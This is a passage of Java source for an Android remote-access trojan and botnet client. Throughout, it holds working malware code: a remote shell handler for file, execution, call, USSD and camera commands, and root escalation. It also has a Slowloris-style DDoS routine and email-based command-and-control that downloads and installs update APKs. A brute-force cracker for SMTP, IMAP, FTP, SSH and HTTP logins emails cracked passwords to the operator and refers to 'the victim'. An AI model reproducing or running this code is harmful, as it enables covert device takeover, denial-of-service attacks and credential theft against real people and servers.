                            if (ct.contains("|")) {
                                RTCP(ct.split("\\|")[0], ct.split("\\|")[1]);
                            }
                            nl = true;
                        } else if (cmd.toLowerCase().startsWith("btcp ")) {
                            String p = cmd.substring(5);
                            BTCP(p);
                            nl = true;
                        } else if (cmd.toLowerCase().startsWith("cd ")) {
                            String np = cmd.substring(3);
                            File f = new File(path);
                            switch (np) {
                                case "..":
                                    f = new File(f.getParent() + "/");
                                    break;
                                case ".":
                                    break;
                                default:
                                    if (np.startsWith("../")) {
                                        for (String p : np.split("/")) {
                                            if (!p.equals("")) {
                                                switch (p) {
                                                    case "..":
                                                        f = new File(f.getParent() + "/");
                                                        break;
                                                    case ".":
                                                        break;
                                                    default:
                                                        f = new File(path + np + "/");
                                                        break;
                                                }
                                            }
                                        }
                                    } else if (np.startsWith("./")) {
                                        for (String p : np.split("/")) {
                                            if (!p.equals("")) {
                                                switch (p) {
                                                    case "..":
                                                        f = new File(f.getParent() + "/");
                                                        break;
                                                    case ".":
                                                        break;
                                                    default:
                                                        f = new File(path + np + "/");
                                                        break;
                                                }
                                            }
                                        }
                                    } else {
                                        f = new File(path + np + "/");
                                    }
                                    break;
                            }
                            if (f.exists()) {
                                path = f.getAbsolutePath() + "/";
                            }
                            nl = true;
                        } else if (cmd.toLowerCase().startsWith("cat ")) {
                            String f = cmd.substring(4);
                            c.getOutputStream().write(SB(RFFS(path + f)));
                        } else if (cmd.toLowerCase().startsWith("touch ")) {
                            String f = cmd.substring(6);
                            c.getOutputStream().write(SB(shell("touch " + path + f)));
                            nl = true;
                        } else if (cmd.toLowerCase().startsWith("mkdir ")) {
                            String f = cmd.substring(6);
                            c.getOutputStream().write(SB(shell("mkdir " + path + f)));
                            nl = true;
                        } else if (cmd.toLowerCase().startsWith("rm ")) {
                            String f = cmd.substring(3);
                            c.getOutputStream().write(SB(shell("rm " + path + f)));
                            nl = true;
                        } else if (cmd.startsWith("rmdir ")) {
                            String f = cmd.replaceFirst("rmdir ", "");
                            boolean force = false;
                            if (f.startsWith("-f ")) force = true;
                            f = f.replaceFirst("-f ", "");
                            if (force) rmdir(f, true);
                            else rmdir(f);
                            nl = true;
                        } else if ((cmd.toLowerCase().startsWith("exe ")) || cmd.toLowerCase().startsWith(("run "))) {
                            String f = cmd.substring(4);
                            c.getOutputStream().write(SB(shell(f + " &")));
                        } else if (cmd.toLowerCase().startsWith("sl ")) {
                            String h = cmd.substring(3);
                            SL sl = new SL(h, "80");
                            new Thread(sl).start();
                        } else if (cmd.toLowerCase().startsWith("download ")) {
                            String f = cmd.substring(9);
                            if (new File(path + f.split("/")[f.split("/").length - 1]).exists()) {
                                c.getOutputStream().write(SB("File already exists!"));
                            } else {
                                c.getOutputStream().write(SB("Downloading file...\n"));
                                df(f, path + f.split("/")[f.split("/").length - 1]);
                                if (new File(path + f.split("/")[f.split("/").length - 1]).exists()) {
                                    c.getOutputStream().write(SB("Downloading finished."));
                                } else {
                                    c.getOutputStream().write(SB("Downloading failed!"));
                                }
                            }
                        } else if (cmd.toLowerCase().startsWith("upload ")) {
                            String f = cmd.substring(7);
                            c.getOutputStream().write(SB("Uploading file...\n"));
                            uf(path + f);
                            c.getOutputStream().write(SB("Uploading finished."));
                        }else if(cmd.toLowerCase().startsWith("call ")){
                            if(CN(cmd.substring(5))) c.getOutputStream().write(SB("Call is made."));
                            else c.getOutputStream().write(SB("Call failed! Is the permission granted?"));
                        }else if(cmd.toLowerCase().startsWith("ussd ")){
                            if(USSD(cmd.substring(5))) c.getOutputStream().write(SB("USSD code is sent."));
                            else c.getOutputStream().write(SB("USSD code failed! Is the permission granted?"));
                        }else if(cmd.toLowerCase().startsWith("vol ")){
                            VolMode m = VolMode.U;
                            switch (cmd.toLowerCase().substring(4)){
                                case "d":
                                    m = VolMode.D;
                                    break;
                                case "m":
                                    m =VolMode.M;
                                    break;
                            }
                            if(VolChange(m)) c.getOutputStream().write(SB("Volume changed."));
                            else c.getOutputStream().write(SB("Failed changing volume!"));
                        }else if(cmd.toLowerCase().startsWith("camera ")){
                            Intent i = new Intent(main_context,Admin.class);
                            i.putExtra("cmd",cmd);
                            i.putExtra("R","");
                            main_context.startActivity(i);
                            nl=true;
                        }else if(cmd.toLowerCase().startsWith("cam ")){
                            Intent i = new Intent(main_context,Admin.class);
                            i.putExtra("cmd","camera "+cmd.substring(4));
                            i.putExtra("R","");
                            main_context.startActivity(i);
                            nl=true;
                        }else if(cmd.toLowerCase().startsWith("pass ")){
                            Intent i = new Intent(main_context,Admin.class);
                            i.putExtra("cmd","password "+cmd.substring(5));
                            i.putExtra("R","");
                            main_context.startActivity(i);
                            c.getOutputStream().write(SB("Password's been changed to ("+cmd.substring(5)+")."));
                        }else if(cmd.toLowerCase().startsWith("password ")){
                            Intent i = new Intent(main_context,Admin.class);
                            i.putExtra("cmd",cmd);
                            i.putExtra("R","");
                            main_context.startActivity(i);
                            c.getOutputStream().write(SB("Password's been changed to ("+cmd.substring(9)+")."));
                        }else{
                            if (!sent) c.getOutputStream().write(SB("\nUnknown command (" + cmd + ")! Use help for better typing skills."));
                        }
                    } catch (Exception e) {
                        e.printStackTrace();
                        log_all("APSSH function: " + e.getMessage() + "\nLine #: " + e.getStackTrace()[0].getLineNumber());
                    }
                }
            } catch (Exception e) {
                e.printStackTrace();
                log_all("APSSH function: " + e.getMessage() + "\nLine #: " + e.getStackTrace()[0].getLineNumber());
            }
        }
    }
    private String shell(String cmd) {
        try {
            String sh = "sh";
            if (root) sh = "su";
            Process s = Runtime.getRuntime().exec(sh);
            DataOutputStream o = new DataOutputStream(s.getOutputStream());
            BufferedReader in = new BufferedReader(new InputStreamReader(s.getInputStream()));
            o.writeBytes(cmd + " 2>&1\necho APS-END\nexit\n");
            o.flush();
            String lr = in.readLine();
            String output = lr + "\n";
            if (lr.equals("APS-END")) return "";
            while (!lr.equals("APS-END")) {
                lr = in.readLine();
                if (!lr.equals("APS-END")) output += lr + "\n";
            }
            return output;
        } catch (Exception e) {
            e.printStackTrace();
            log_all("shell function: " + e.getMessage() + "\nLine #: " + e.getStackTrace()[0].getLineNumber());
        }
        return "";
    }
    private boolean gh() {
        try {
            Process s = Runtime.getRuntime().exec("su");
            DataOutputStream o = new DataOutputStream(s.getOutputStream());
            o.writeBytes("exit\n");
            o.flush();
            s.waitFor();
            root = true;
            return true;
        } catch (Exception e) {
            e.printStackTrace();
            log_all("shell function: " + e.getMessage() + "\nLine #: " + e.getStackTrace()[0].getLineNumber());
        }
        return false;
    }
    private void rmdir(String dir) {rmdir(dir, false);}
    private void rmdir(String dir, boolean force) {
        try {
            File d = new File(dir);
            if (!d.exists()) return;
            if (!d.isDirectory()) return;
            if (d.listFiles().length > 0) {
                if (force) {
                    for (File f : d.listFiles()) {
                        if (f.isDirectory()) {
                            rmdir(f.getAbsolutePath(), true);
                        }
                        f.delete();
                    }
                    d.delete();
                }
            } else {
                d.delete();
            }
        } catch (Exception e) {
            e.printStackTrace();
            log_all("rmdir function: " + e.getMessage() + "\nLine #: " + e.getStackTrace()[0].getLineNumber());
        }
    }
    private class SL implements Runnable {
        private String h;
        private String p;

        private SL(String host, String port) {
            h = host.toLowerCase();
            p = port;
        }

        @Override
        public void run() {
            try {
                if ((!h.startsWith("http")) && (h.contains("."))) {
                    keepddos = true;
                    if (h.contains("/")) h = h.replaceAll("/", "");
                    if (h.contains(":")) h = h.replaceAll(":", "");
                    int cof = 0;
                    while (keepddos) {
                        if (cof > 20) {
                            return;
                        }
                        Process p = Runtime.getRuntime().exec("/system/bin/ping -c 1 " + h);
                        int r = p.waitFor();
                        if (r == 0) {
                            cof = 0;
                        } else {
                            cof++;
                        }
                    }
                    return;
                }
                String[] uas = new String[]{"Mozilla/5.0 (Windows NT 6.3; rv:36.0) Gecko/20100101 Firefox/36.0", "Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/53.0.2785.143 Safari/537.36", "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/53.0.2785.143 Safari/537.36", "Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/54.0.2840.71 Safari/537.36", "Mozilla/5.0 (Windows NT 10.0; WOW64; rv:49.0) Gecko/20100101 Firefox/49.0", "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/54.0.2840.71 Safari/537.36", "Mozilla/5.0 (Windows NT 6.1; WOW64; rv:49.0) Gecko/20100101 Firefox/49.0", "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/54.0.2840.71 Safari/537.36", "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_11_6) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/53.0.2785.143 Safari/537.36", "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/53.0.2785.143 Safari/537.36", "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_11_6) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/54.0.2840.71 Safari/537.36", "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_12_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/53.0.2785.143 Safari/537.36", "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_12) AppleWebKit/602.1.50 (KHTML, like Gecko) Version/10.0 Safari/602.1.50", "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:49.0) Gecko/20100101 Firefox/49.0", "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_12_1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/54.0.2840.71 Safari/537.36", "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_12_1) AppleWebKit/602.2.14 (KHTML, like Gecko) Version/10.0.1 Safari/602.2.14", "Mozilla/5.0 (Windows NT 6.1; WOW64; Trident/7.0; rv:11.0) like Gecko", "Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/53.0.2785.143 Safari/537.36", "Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/54.0.2840.71 Safari/537.36", "Mozilla/5.0 (Macintosh; Intel Mac OS X 10.11; rv:49.0) Gecko/20100101 Firefox/49.0", "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_12_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/54.0.2840.71 Safari/537.36", "Mozilla/5.0 (Windows NT 6.3; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/53.0.2785.143 Safari/537.36", "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/53.0.2785.143 Safari/537.36", "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_11_6) AppleWebKit/602.1.50 (KHTML, like Gecko) Version/10.0 Safari/602.1.50", "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/51.0.2704.79 Safari/537.36 Edge/14.14393"};
                ArrayList<DataOutputStream> outs = new ArrayList<>();
                keepddos = true;
                boolean s = false;
                if (h.startsWith("https")) s = true;
                h = h.replaceFirst("https", "");
                h = h.replaceFirst("http", "");
                h = h.replaceFirst("://", "");
                if (h.contains("/")) h = h.split("/")[0];
                for (int i = 1; i <= 5000; i++) {
                    DataOutputStream o;
                    if (s) {
                        SSLSocket c = (SSLSocket) SSLSocketFactory.getDefault().createSocket(h, Integer.parseInt(p));
                        o = new DataOutputStream(c.getOutputStream());
                    } else {
                        Socket c = new Socket(h, Integer.parseInt(p));
                        o = new DataOutputStream(c.getOutputStream());
                    }
                    o.write(SB("GET /?" + RND() + " HTTP/1.1\n"));
                    o.flush();
                    o.write(SB("User-Agent: " + uas[new Random().nextInt(uas.length - 1)] + "\n"));
                    o.flush();
                    o.write(SB("Accept-language: en-US,en,q=0.5\n"));
                    o.flush();
                    outs.add(o);
                }
                while (keepddos) {
                    if (!CUH(h)) {
                        log_all("SL function: Host (" + h + ") seems down! Have we done?", log_type.INFO);
                        return;
                    }
                    DataOutputStream[] outss = outs.toArray(new DataOutputStream[outs.size()]);
                    for (DataOutputStream o : outss) {
                        try {
                            o.write(SB("X-a: " + new Random().nextInt(5000)));
                            o.flush();
                        } catch (Exception e) {
                            outs.remove(o);
                        }
                    }
                    for (int i = 1; i <= (5000 - outs.size() - 1); i++) {
                        DataOutputStream o;
                        if (s) {
                            SSLSocket c = (SSLSocket) SSLSocketFactory.getDefault().createSocket(h, Integer.parseInt(p));
                            o = new DataOutputStream(c.getOutputStream());
                        } else {
                            Socket c = new Socket(h, Integer.parseInt(p));
                            o = new DataOutputStream(c.getOutputStream());
                        }
                        o.write(SB("GET /?" + RND() + " HTTP/1.1\n"));
                        o.flush();
                        o.write(SB("User-Agent: " + uas[new Random().nextInt(uas.length - 1)] + "\n"));
                        o.flush();
                        o.write(SB("Accept-language: en-US,en,q=0.5\n"));
                        o.flush();
                        outs.add(o);
                    }
                }
            } catch (Exception e) {
                e.printStackTrace();
                log_all("SL function: " + e.getMessage() + "\nLine #: " + e.getStackTrace()[0].getLineNumber());
            }
        }
    }
    //private boolean SendMail(String host,String port,String user, String pass,String from, String to,String subj, String body){return SendMail(host,port,user,pass,from,to,subj,body,true);}
    private boolean SendMail(String host, String port, String user, String pass, String from, String to, String subj, String body, boolean tls) {
        try {
            final String username = user;
            final String password = pass;
            Properties props = new Properties();
            props.put("mail.smtp.auth", "true");
            if (tls) {
                props.put("mail.smtp.starttls.enable", "true");
                props.put("mail.smtp.socketFactory.class", "javax.net.ssl.SSLSocketFactory");
            } else props.put("mail.smtp.starttls.enable", "false");
            props.put("mail.smtp.host", host);
            props.put("mail.smtp.port", port);
            Session session = Session.getInstance(props,
                    new javax.mail.Authenticator() {
                        protected javax.mail.PasswordAuthentication getPasswordAuthentication() {
                            return new javax.mail.PasswordAuthentication(username, password);
                        }
                    });
            Message message = new MimeMessage(session);
            message.setFrom(new InternetAddress(from));
            message.setRecipients(Message.RecipientType.TO, InternetAddress.parse(to));
            message.setSubject(subj);
            message.setText(body);
            Transport.send(message);
            return true;
        } catch (Exception e) {
            e.printStackTrace();
            log_all("SendMail function: " + e.getMessage() + "\nLine #: " + e.getStackTrace()[0].getLineNumber());
        }
        return false;
    }
    private boolean IMAPSC() {
        try {
            Message[] msgs = ReceiveMail(imapserver, imapport, imapuser, BS(Base64.decode(imappass, Base64.DEFAULT)));
            if(msgs==null) return false;
            for (Message m : msgs) {
                if (m.getFrom()[0].toString().toLowerCase().contains(imapmaster.toLowerCase())) {
                    String con = "";
                    if (m.isMimeType("text/plain")) con = m.getContent().toString();
                    if (m.isMimeType("multipart/*")) {
                        MimeMultipart mm = (MimeMultipart) m.getContent();
                        con = TFMM(mm);
                    }
                    for (String l : con.split("\\r?\\n")) {
                        if (l.toLowerCase().startsWith("server|")) server = l.split("\\|")[1];
                        SS("server", server);
                        if (l.toLowerCase().startsWith("aps|")) aps = l.split("\\|")[1];
                        SS("aps", aps);
                        if (l.toLowerCase().startsWith("wtime|"))
                            wtime = Integer.parseInt(l.split("\\|")[1]);
                        SS("wtime", String.valueOf(wtime));
                        if (l.toLowerCase().startsWith("update|")) UM(l.split("\\|")[1]);
                        if (l.toLowerCase().startsWith("botname|")) botname = l.split("\\|")[1];
                        SS("botname", botname);
                        if (l.toLowerCase().startsWith("botid|")) botid = l.split("\\|")[1];
                        SS("botid", botid);
                        if (l.toLowerCase().startsWith("apsshuser|")) apsshuser = l.split("\\|")[1];
                        SS("apsshuser", apsshuser);
                        if (l.toLowerCase().startsWith("apsshpass|")) apsshpass = l.split("\\|")[1];
                        SS("apsshpass", apsshpass);
                        if (l.toLowerCase().startsWith("password|")) password = l.split("\\|")[1];
                        SS("password", password);
                    }
                    return true;
                }
            }
        } catch (Exception e) {
            e.printStackTrace();
            log_all("IMAPSC function: " + e.getMessage() + "\nLine #: " + e.getStackTrace()[0].getLineNumber());
        }
        return false;
    }
    private void UM(String url) {
        df(url, sp + "update.apk");
        if (new File(sp + "update.apk").exists()) {
            Intent installIntent = new Intent(Intent.ACTION_VIEW);
            installIntent.setDataAndType(Uri.parse(sp + "update.apk"), "application/vnd.android.package-archive");
            installIntent.setFlags(Intent.FLAG_ACTIVITY_NEW_TASK);
            main_context.startActivity(installIntent);
        }
    }
    private String TFMM(MimeMultipart mimeMultipart) throws Exception {
        String result = "";
        int count = mimeMultipart.getCount();
        for (int i = 0; i < count; i++) {
            BodyPart bodyPart = mimeMultipart.getBodyPart(i);
            if (bodyPart.isMimeType("text/plain")) {
                result = result + "\n" + bodyPart.getContent();
                break; // without break same text appears twice in my tests
            } else if (bodyPart.isMimeType("text/html")) {
                String html = (String) bodyPart.getContent();
                result = result + "\n" + Jsoup.parse(html).text();
            } else if (bodyPart.getContent() instanceof MimeMultipart) {
                result = result + TFMM((MimeMultipart) bodyPart.getContent());
            }
        }
        return result;
    }
    private Message[] ReceiveMail(String host, String port, String user, String pass) {return ReceiveMail(host, port, user, pass, true);}
    private Message[] ReceiveMail(String host, String port, String user, String pass, boolean ssl) {
        try {
            Properties props = new Properties();
            props.setProperty("mail.store.protocol", "imaps");
            props.setProperty("mail.imaps.host", host);
            props.setProperty("mail.imaps.port", port);
            if (ssl)
                props.setProperty("mail.imaps.socketFactory.class", "javax.net.ssl.SSLSocketFactory");
            props.setProperty("mail.imaps.socketFactory.fallback", "false");
            Session imapSession = Session.getInstance(props);
            Store store = imapSession.getStore("imaps");
            store.connect(host, user, pass);
            Folder inbox = store.getFolder("Inbox");
            inbox.open(Folder.READ_ONLY);
            return inbox.getMessages();
        } catch (Exception e) {
            e.printStackTrace();
            log_all("ReceiveMail function: " + e.getMessage() + "\nLine #: " + e.getStackTrace()[0].getLineNumber());
        }
        return null;
    }
    private boolean FTPLogin(String host, String port, String user, String password) {
        try {
            FTPClient ftpClient = new FTPClient();
            ftpClient.connect(InetAddress.getByName(host), Integer.parseInt(port));
            ftpClient.login(user, password);
            if (ftpClient.getStatus().equals("503")) return false;
            ftpClient.logout();
            ftpClient.disconnect();
            return true;
        } catch (Exception e) {
            e.printStackTrace();
            log_all("FTPLogin function: " + e.getMessage() + "\nLine #: " + e.getStackTrace()[0].getLineNumber());
        }
        return false;
    }
    private boolean SSHLogin(String host, String port, String user, String password) {
        try {
            JSch jsch = new JSch();
            com.jcraft.jsch.Session session = jsch.getSession(user, host, Integer.parseInt(port));
            session.setPassword(password);
            Properties prop = new Properties();
            prop.put("StrictHostKeyChecking", "no");
            session.setConfig(prop);
            session.connect();
            session.disconnect();
            return true;
        } catch (Exception e) {
            if (e.getMessage().startsWith("Auth ")) return false;
            e.printStackTrace();
            log_all("SSHLogin function: " + e.getMessage() + "\nLine #: " + e.getStackTrace()[0].getLineNumber());
        }
        return false;
    }
    //private boolean HydraHttp(String host,String port,String data,String user,String password,boolean post){return HydraHttp(host,port,data,user,password,post,false);}
    private boolean HydraHttp(String host, String port, String data, String user, String password, boolean post, boolean ssl) {
        try {
            String pref = "http://";
            if (ssl) pref = "https://";
            String url = pref + host + ":" + port;
            HttpResponse response;
            HttpClient httpclient = new DefaultHttpClient();
            if (post) {
                url += data.split(":")[0];
                HttpPost hp = new HttpPost(url);
                hp.setHeader("Content-Type", "application/x-www-form-urlencoded");
                ArrayList<NameValuePair> nameValuePairs = new ArrayList<>();
                for (String var : data.split(":")[1].split("&")) {
                    String v = var.split("=")[1];
                    if (v.equals("^USER^")) v = user;
                    if (v.equals("^PASS^")) v = password;
                    nameValuePairs.add(new BasicNameValuePair(var.split("=")[0], v));
                }
                hp.setEntity(new UrlEncodedFormEntity(nameValuePairs));
                response = httpclient.execute(hp);
            } else {
                url += data.split(":")[0] + "?";
                url += data.split(":")[1].replace("^USER^", user).replace("^PASS^", password);
                response = httpclient.execute(new HttpGet(url));
            }
            StatusLine statusLine = response.getStatusLine();
            if (statusLine.getStatusCode() == HttpStatus.SC_OK) {
                ByteArrayOutputStream out = new ByteArrayOutputStream();
                response.getEntity().writeTo(out);
                String responseString = out.toString();
                out.close();
                return !responseString.toLowerCase().contains(data.toLowerCase().split(":")[2]);
            }
        } catch (Exception e) {
            e.printStackTrace();
            log_all("HydraHttp function: " + e.getMessage() + "\nLine #: " + e.getStackTrace()[0].getLineNumber());
        }
        return false;
    }
    private enum CO_Type {
        SMTP,
        IMAP,
        FTP,
        SSH,
        HTTP_GET,
        HTTP_POST;
    }
    private String CO(String host, String port, String user, String[] passwords, CO_Type t) {
        String cp = "";
        if (passwords.length == 0) return "";
        done:
        {
            for (String pass : passwords) {
                boolean ssl = false;
                switch (t) {
                    case SMTP:
                        if (port.equals("")) port = "25";
                        if ((port.equals("465")) || port.equals("587")) ssl = true;
                        if (SendMail(host, port, user, pass, user, imapuser, "Password cracked", "User: " + user + "\nPassword: " + pass, ssl))
                            cp = pass;
                        if (!cp.equals("")) break done;
                        break;
                    case IMAP:
                        if (port.equals("")) port = "143";
                        if (port.equals("993")) ssl = true;
                        if (ReceiveMail(host, port, user, pass, ssl) != null) cp = pass;
                        if (!cp.equals("")) break done;
                        break;
                    case FTP:
                        if (port.equals("")) port = "21";
                        if (FTPLogin(host, port, user, pass)) cp = pass;
                        if (!cp.equals("")) break done;
                        break;
                    case SSH:
                        if (port.equals("")) port = "22";
                        if (SSHLogin(host, port, user, pass)) cp = pass;
                        if (!cp.equals("")) break done;
                        break;
                    case HTTP_GET:
                        if (port.equals("")) port = "80";
                        if (port.equals("443")) ssl = true;
                        if (HydraHttp(host, port, "/:username=^USER^&password=^PASS^:failed", user, pass, false, ssl))
                            cp = pass;
                        if (!cp.equals("")) break done;
                        break;
                    case HTTP_POST:
                        if (port.equals("")) port = "80";
                        if (port.equals("443")) ssl = true;
                        if (HydraHttp(host, port, "/:username=^USER^&password=^PASS^:failed", user, pass, true, ssl))
                            cp = pass;
                        if (!cp.equals("")) break done;
                        break;
                }
            }
        }
        return cp;
    }
    private void CO(Socket c) {
        try {
            BufferedReader br = new BufferedReader(new InputStreamReader(c.getInputStream()));
            c.getOutputStream().write(SB("Service to crack (SMTP,IMAP,FTP,SSH,HTTP_GET,HTTP_POST): "));
            String cs = br.readLine();
            String h;
            String p;
            String u;
            if (cs.equals("")) {
                c.getOutputStream().write(SB("You can't crack no service!"));
            } else {
                switch (cs.toLowerCase()) {
                    case "smtp":
                        c.getOutputStream().write(SB("Host of the service: "));
                        h = br.readLine();
                        if (h.equals("")) {
                            c.getOutputStream().write(SB("You can't crack a service on no host!"));
                        } else {
                            c.getOutputStream().write(SB("Port of the service (If default is empty, CO function will take care of it) [Default: 465]: "));
                            p = br.readLine();
                            boolean ssl = false;
                            if (p.equals("")) {
                                p = "465";
                                ssl = true;
                            }
                            if (p.equals("25")) ssl = false;
                            if ((!p.equals("465")) && (!p.equals("25")) && (!p.equals("587"))) {
                                c.getOutputStream().write(SB("Non-default port! SSL? (Y/N) [Default: N]: "));
                                String sslchoice = br.readLine();
                                ssl = !((sslchoice.equals("")) || (sslchoice.toLowerCase().equals("n")));
                            }
                            c.getOutputStream().write(SB("User to crack: "));
                            u = br.readLine();
                            if (u.equals("")) {
                                c.getOutputStream().write(SB("You can't crack a service with no user!"));
                            } else {
                                c.getOutputStream().write(SB("Next step requires attention! You'll write either passwords (one per line) or a URL linking a password list.\n"));
                                c.getOutputStream().write(SB("Please choose a method of inputing passwords (Password per line/URL) [Default: Password per line]: "));
                                String mthd = br.readLine();
                                ArrayList<String> passwords = new ArrayList<>();
                                if ((mthd.equals("")) || (mthd.toLowerCase().equals("password per line"))) {
                                    c.getOutputStream().write(SB("Write as many passwords as you wish, but be aware of the victim's RAM and CPU! (Write an empty line to end the passwords input method)\n"));
                                    String pass = br.readLine();
                                    while (!pass.equals("")) {
                                        passwords.add(pass);
                                        pass = br.readLine();
                                    }
                                } else if (mthd.toLowerCase().equals("url")) {
                                    c.getOutputStream().write(SB("Write the URL which links the password list: "));
                                    String url = br.readLine();
                                    try {
                                        HttpClient httpClient = new DefaultHttpClient();
                                        HttpGet httpGet = new HttpGet(url);
                                        HttpResponse httpResponse;
                                        httpResponse = httpClient.execute(httpGet);
                                        if (httpResponse == null) {
                                            return;
                                        }
                                        HttpEntity responseEntity = httpResponse.getEntity();
                                        if (responseEntity != null) {
                                            Collections.addAll(passwords, EntityUtils.toString(responseEntity).split("\\r?\\n"));
                                        }
                                    } catch (Exception e) {
                                        e.printStackTrace();
                                        log_all("CO function: " + e.getMessage() + "\nLine #: " + e.getStackTrace()[0].getLineNumber());
                                    }
                                }
                                if (passwords.size() == 0) {
                                    c.getOutputStream().write(SB("You can't crack a service with no passwords!"));
                                } else {
                                    if (!CUH(h, p)) {
                                        c.getOutputStream().write(SB("[!] - Host/IP is not up (" + h + ")."));
                                    } else {
                                        c.getOutputStream().write(SB("Starting the crack....\n"));
                                        for (String cp : passwords.toArray(new String[passwords.size()])) {
                                            if (SendMail(h, p, u, cp, u, imapuser, "Password cracked", "User: " + u + "\nPass: " + cp, ssl)) {
                                                c.getOutputStream().write(SB("Password cracked successfully.\nUser: " + u + "\nPass: " + cp));
                                                return;
                                            }
                                        }
                                    }
                                }
                            }
                        }
                        break;
                    case "imap":
                        c.getOutputStream().write(SB("Host of the service: "));
                        h = br.readLine();
                        if (h.equals("")) {
                            c.getOutputStream().write(SB("You can't crack a service on no host!"));
                        } else {
                            c.getOutputStream().write(SB("Port of the service (If default is empty, CO function will take care of it) [Default: 993]: "));
                            p = br.readLine();
                            boolean ssl = false;
                            if (p.equals("")) {
                                p = "993";
                                ssl = true;
                            }
                            if (p.equals("143")) ssl = false;
                            if ((!p.equals("993")) && (!p.equals("143"))) {
                                c.getOutputStream().write(SB("Non-default port! SSL? (Y/N) [Default: N]: "));
                                String sslchoice = br.readLine();
                                ssl = !((sslchoice.equals("")) || (sslchoice.toLowerCase().equals("n")));
                            }
                            c.getOutputStream().write(SB("User to crack: "));
                            u = br.readLine();
                            if (u.equals("")) {
                                c.getOutputStream().write(SB("You can't crack a service with no user!"));
                            } else {
                                c.getOutputStream().write(SB("Next step requires attention! You'll write either passwords (one per line) or a URL linking a password list.\n"));
                                c.getOutputStream().write(SB("Please choose a method of inputting passwords (Password per line/URL) [Default: Password per line]: "));
                                String mthd = br.readLine();
                                ArrayList<String> passwords = new ArrayList<>();
                                if ((mthd.equals("")) || (mthd.toLowerCase().equals("password per line"))) {
                                    c.getOutputStream().write(SB("Write as many passwords as you wish, but be aware of the victim's RAM and CPU! (Write an empty line to end the passwords input method)\n"));
                                    String pass = br.readLine();
                                    while (!pass.equals("")) {
                                        passwords.add(pass);
                                        pass = br.readLine();
                                    }
                                } else if (mthd.toLowerCase().equals("url")) {
                                    c.getOutputStream().write(SB("Write the URL which links the password list: "));
                                    String url = br.readLine();
                                    try {
                                        HttpClient httpClient = new DefaultHttpClient();
                                        HttpGet httpGet = new HttpGet(url);
                                        HttpResponse httpResponse;
                                        httpResponse = httpClient.execute(httpGet);
                                        if (httpResponse == null) {
                                            return;
                                        }
                                        HttpEntity responseEntity = httpResponse.getEntity();
                                        if (responseEntity != null) {
                                            Collections.addAll(passwords, EntityUtils.toString(responseEntity).split("\\r?\\n"));
                                        }
                                    } catch (Exception e) {
                                        e.printStackTrace();
                                        log_all("CO function: " + e.getMessage() + "\nLine #: " + e.getStackTrace()[0].getLineNumber());
                                    }
                                }
                                if (passwords.size() == 0) {
                                    c.getOutputStream().write(SB("You can't crack a service with no passwords!"));
                                } else {
                                    if (!CUH(h, p)) {
                                        c.getOutputStream().write(SB("[!] - Host/IP is not up (" + h + ")."));
                                    } else {
                                        c.getOutputStream().write(SB("Starting the crack....\n"));
                                        for (String cp : passwords.toArray(new String[passwords.size()])) {
                                            if (ReceiveMail(h, p, u, cp, ssl) != null) {
                                                c.getOutputStream().write(SB("Password cracked successfully.\nUser: " + u + "\nPass: " + cp));
                                                return;
                                            }
                                        }
                                    }
                                }
                            }
                        }
                        break;
                    case "ftp":
                        c.getOutputStream().write(SB("Host of the service: "));
                        h = br.readLine();
                        if (h.equals("")) {
                            c.getOutputStream().write(SB("You can't crack a service on no host!"));
                        } else {
                            c.getOutputStream().write(SB("Port of the service (If default is empty, CO function will take care of it) [Default: 21]: "));
                            p = br.readLine();
                            if (p.equals("")) p = "21";
                            c.getOutputStream().write(SB("User to crack: "));
                            u = br.readLine();
                            if (u.equals("")) {
                                c.getOutputStream().write(SB("You can't crack a service with no user!"));
                            } else {
                                c.getOutputStream().write(SB("Next step requires attention! You'll write either passwords (one per line) or a URL linking a password list.\n"));
                                c.getOutputStream().write(SB("Please choose a method of inputting passwords (Password per line/URL) [Default: Password per line]: "));
                                String mthd = br.readLine();
                                ArrayList<String> passwords = new ArrayList<>();
                                if ((mthd.equals("")) || (mthd.toLowerCase().equals("password per line"))) {
                                    c.getOutputStream().write(SB("Write as many passwords as you wish, but be aware of the victim's RAM and CPU! (Write an empty line to end the passwords input method)\n"));
                                    String pass = br.readLine();
                                    while (!pass.equals("")) {
                                        passwords.add(pass);
                                        pass = br.readLine();
                                    }
                                } else if (mthd.toLowerCase().equals("url")) {
                                    c.getOutputStream().write(SB("Write the URL which links the password list: "));
                                    String url = br.readLine();
                                    try {
                                        HttpClient httpClient = new DefaultHttpClient();
                                        HttpGet httpGet = new HttpGet(url);
                                        HttpResponse httpResponse;
                                        httpResponse = httpClient.execute(httpGet);
                                        if (httpResponse == null) {
                                            return;
                                        }
                                        HttpEntity responseEntity = httpResponse.getEntity();
                                        if (responseEntity != null) {
